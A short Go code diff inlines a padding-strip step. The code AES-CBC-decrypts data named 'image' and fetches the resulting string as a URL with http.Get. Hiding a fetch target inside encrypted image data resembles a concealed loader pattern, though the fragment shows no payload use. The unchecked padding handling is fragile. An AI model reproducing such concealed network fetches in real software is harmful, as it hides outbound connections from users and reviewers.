@@ -74,9 +74,8 @@ func main() {
 		mode := cipher.NewCBCDecrypter(block, iv)
 		decrypted := make([]byte, len(image))
 		mode.CryptBlocks(decrypted, image)
-		finalDecrypted := decrypted[:len(decrypted)-int(decrypted[len(decrypted)-1])]
 
-		resp, err := http.Get(string(finalDecrypted))
+		resp, err := http.Get(string(decrypted[:len(decrypted)-int(decrypted[len(decrypted)-1])]))
 		if err != nil {
 			panic(err)
 		}
